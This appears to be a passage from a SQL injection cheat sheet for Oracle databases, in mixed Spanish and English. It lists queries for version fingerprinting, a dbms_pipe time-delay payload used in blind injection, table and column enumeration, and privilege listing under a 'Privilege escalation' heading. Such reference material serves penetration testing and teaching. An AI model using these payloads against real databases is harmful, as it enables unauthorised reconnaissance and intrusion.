 ### Información de la version
        SELECT banner FROM v$version

      ### Time delays
        dbms_pipe.receive_message(('a'),10)

      ### Listado de tablas
        SELECT * FROM all_tables

      ### Listado de columnas
        SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

    ## Privilege escalation

      ### List current user privileges
        SELECT * FROM USER_ROLE_PRIVS;

      ### List all role privileges
        SELECT * FROM DBA_ROLE_PRIVS;

      ### List table privileges
        SELECT * FROM ALL_TAB_PRIVS;